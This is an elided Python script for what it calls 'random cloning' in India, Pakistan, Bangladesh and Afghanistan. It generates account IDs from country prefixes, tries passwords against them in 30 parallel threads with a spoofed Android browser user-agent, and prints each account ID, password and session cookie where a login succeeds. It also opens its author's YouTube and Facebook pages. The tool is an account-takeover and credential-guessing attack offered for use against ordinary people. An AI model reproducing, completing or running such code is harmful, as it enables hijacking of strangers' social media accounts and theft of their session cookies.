...
def menu_apikey():
    ...
    print(f"")
    print(f"\033[1;31m[0]TODAY DATE & TIME     :\033[1;37m[•] {ha}/{bu}/{ta} \033[1;37m[•]~> \033[1;37m[•] "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    ...
    hamii = input("🌺CHOOSE : ")
    if hamii in ["1","01"]:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100031946417280")
        password()
...
def password():
    ...
    print(f"")
    print(f"\033[1;33m[1] INDIA RANDOM CLONING  ")
    print(f"\033[1;36m[2] PAKISTAN RANDOM CLONING ")
    print(f"\033[1;32m[3] BANGLADESH RANDOM CLONING ")
    print(f"\033[1;35m[4] AFGANISTAN RANDOM CLONING ")
    print(f"\033[1;31m[•]==============================================")
    print("")
    passX = input(f" \033[1;37m[•]CHOOSE{hamii2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://www.youtube.com/@sami-tricker")
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.youtube.com/@sami-tricker")
        password2()
        ...
        os.system("xdg-open https://www.youtube.com/@sami-tricker5")
        password6()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]---------------------#
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f"\033[1;3wm[•]TO STOP PROCESS PRESS Ctrl + Z ")
        print(f"\033[1;31m[•]==============================================")
        for love in user:
            uid = code+love
            mk = uid[:6]
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\r\033[1;32m[SAMI-OK] '+uid+'|'+ps+ '')
                print("\33[1;93m[🍪] \33[1;93mCOOKIES : \33[1;92m"+coki)
